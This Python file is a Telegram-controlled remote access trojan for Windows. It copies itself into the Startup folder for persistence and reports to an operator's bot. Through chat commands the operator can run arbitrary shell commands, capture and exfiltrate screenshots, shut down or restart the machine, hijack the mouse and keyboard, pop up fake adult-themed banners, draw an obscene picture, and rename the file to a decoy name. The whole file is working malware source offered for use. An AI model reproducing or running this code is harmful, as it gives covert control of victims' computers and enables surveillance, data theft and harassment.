import sys
import turtle
import pyttsx3
import pyautogui
import os
from data import bot_settings, tg_id
import telebot
import webbrowser
import random
names_for_file = ['Dispatcher', 'Book', 'Mvideo', 'Handler']


try:
    Thisfile = sys.argv[0]
    Thisfile_name = os.path.basename(Thisfile)
    user_path = os.path.expanduser('~')
    if not os.path.exists(
            f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(
            f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
except:
    pass


bot = telebot.TeleBot(f"{bot_settings['token']}")
bot.send_message(tg_id, 'Бот запущен!')


def all_commands(message):
    bot.send_message(message.chat.id, '''/open_link ...' - (через 1 ПРОБЕЛ ссылка)
/random_click_for_time ... - через пробел ЦЕЛОЕ число(количество кликов)
/restart_pc - название говорит за себя
/shutdown_pc - выключение пк
/screenshot - скрин
/kill_file - самоуничтожение
/move_mouse ... - через пробел ЦЕЛОЕ число(количество перемещений мыши)
/banner ...- вылезет окно с подозрительным текстом(на месте ... целое число(кол-во банеров) или ничего(10 раз))
/own_message ... - свое сообщение вылезет на экране(через пробел после команды)
/draw_penis - нарисовать соответствующий объект на экране
/say_text ... - проговорит текстовое сообщение(через пробел после команды)
/cmd_command ... cmd команда(писать через пробел ) ЧЕРЕЗ next каждую новую строку
/click ... - указываем 2 координаты через пробел(/click 1920 1080 ...) + можно добавить последний параметр - количество кликов)
/add_to_autolaunch
                            ''')


@bot.message_handler(content_types=['text'])
def get_text_message(message):
    try:
        if message.text == '/help':
            all_commands(message)

        if message.text.startswith('/open_link'):
            true_link = message.text.split()[1]
            webbrowser.open(true_link, new=0, autoraise=True)

        if message.text.startswith('/random_click_for_time'):
            true_val = int(message.text.split()[1])
            bot.send_message(message.chat.id, "послание сработало")

            for i in range(true_val):
                keys = pyautogui.KEYBOARD_KEYS
                x, y = pyautogui.size()
                x1, y1 = random.randint(0, x), random.randint(0, y)
                pyautogui.click(x1, y1)
                pyautogui.press(random.choice(keys))

        if message.text.startswith('/restart_pc'):
            bot.send_message(message.chat.id, "послание сработало")
            os.system("shutdown /r /t 1")

        if message.text.startswith('/shutdown_pc'):
            bot.send_message(message.chat.id, "послание сработало")
            os.system("shutdown /s /t 1")

        if message.text.startswith('/move_mouse'):
            true_val = int(message.text.split()[1])
            bot.send_message(message.chat.id, "послание сработало")
            for i in range(true_val):
                x, y = pyautogui.size()
                x1, y1 = random.randint(0, x), random.randint(0, y)
                pyautogui.moveTo(x1, y1)

        if message.text.startswith('/banner'):

            bruh_messages = [["Вам больше 18?", "БЕСПЛАТНАЯ ОНЛАЙН игра для ВЗРОСЛЫХ", ("Да, точно", "Конечно")],
                             ["Желаете развлечься?", "ПОКА ЖЕНА НЕ ВИДИТ, НАЧНИТЕ ЗАК..", ("Confirm", "Confirm")],
                             ["Вы достигли совершеннолетия?", "Новая игра(подойдёт импотентам)!!",
                              ("Кровавое воскресенье", "нет")],
                             [f'Перед вами стоит козёл, вопрос:"Сколько?"', 'Викторина'
                                                                            'Вставить текст'], ['Приветик))']]
            if message.text == '/banner':
                for i in range(10):
                    pyautogui.confirm(*random.choice(bruh_messages))
                bot.send_message(message.chat.id, 'Успешно')
            else:
                need_val = int(''.join(message.text.split()[1:]))
                for i in range(need_val):
                    pyautogui.confirm(*random.choice(bruh_messages))
                    bot.send_message(message.chat.id, 'Успешно')

        if message.text.startswith('/own_message'):
            true_msg = ' '.join(message.text.split()[1:])
            pyautogui.alert(true_msg)
            bot.send_message(message.chat.id, 'успешно')

        if message.text.startswith('/say_text'):
            true_text = ' '.join(message.text.split()[1:])
            bot.send_message(message.chat.id, 'Принято')
            engine = pyttsx3.init()

            engine.say(true_text)
            engine.runAndWait()
            engine.stop()

        if message.text.startswith('/draw_penis'):
            t = turtle.Turtle()


            screen = turtle.Screen()
            screen.setup(width=1.0, height=1.0)


            def curve():
                for i in range(200):
                    t.right(1)
                    t.forward(1)

            # first circle
            t.fillcolor("black")
            t.begin_fill()
            t.circle(50)
            t.end_fill()


            t.penup()
            t.setpos(100, 0)
            t.pendown()

            # second circle
            t.fillcolor("black")
            t.begin_fill()
            t.circle(50)
            t.end_fill()


            t.left(90)
            t.forward(250)


            t.fillcolor("brown")
            t.begin_fill()
            t.circle(50)
            t.end_fill()


            t.fillcolor("black")
            t.begin_fill()
            t.left(90)
            t.forward(100)

            t.left(90)
            t.forward(200)

            t.left(90)
            t.forward(100)
            t.end_fill()


            t.backward(45)
            t.left(90)
            t.forward(250)



            curve()

            turtle.done()

            bot.send_message(message.chat.id, 'выполнено')

        if message.text.startswith('/screenshot'):
            def snd_doc(
                    name_doc):
                bot.send_document(message.chat.id, open(name_doc, "rb"))

            screen = pyautogui.screenshot('s.jpg')
            snd_doc("s.jpg")
            os.system("del s.jpg")
        if message.text.startswith('/cmd_command'):
            bot.send_message(message.chat.id, 'Начинается')
            new_msg = message.text[12:]
            true_command = '@echo off\n' + '\n'.join(new_msg.split('next'))
            with open(fr'{user_path}\\Desktop\\lol.bat', 'w') as file:
                file.write(true_command)
            os.system(fr'{user_path}\\Desktop\\lol.bat')
            os.system(fr'del {user_path}\\Desktop\\lol.bat')
            bot.send_message(message.chat.id, 'Команда выполнена!')

        if message.text.startswith('/click'):
            x, y = map(int, message.text.split()[1:3])
            if message.text.split()[3:]:
                for i in range(int(message.text.split()[3:][0])):
                    pyautogui.click(x, y)
            else:
                pyautogui.click(x, y)

        if message.text.startswith('/kill_file'):
            f'DEL /F "{Thisfile}"'

        if message.text.startswith('/add_to_autolaunch'):
            if not os.path.exists(
                    f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
                os.system(
                    f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
                bot.send_message(message.chat.id, 'Команда выполнена!')
        if message.text.startswith('/create_and_rename'):
            os.system(f'RENAME {Thisfile} {random.choice(names_for_file)}')
            new_name = sys.argv[0]

            os.system(
                f'copy "{new_name}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
            os.system(f'DEL /F "{Thisfile}"')




    except:
        bot.send_message(message.chat.id, 'Error')


bot.infinity_polling()
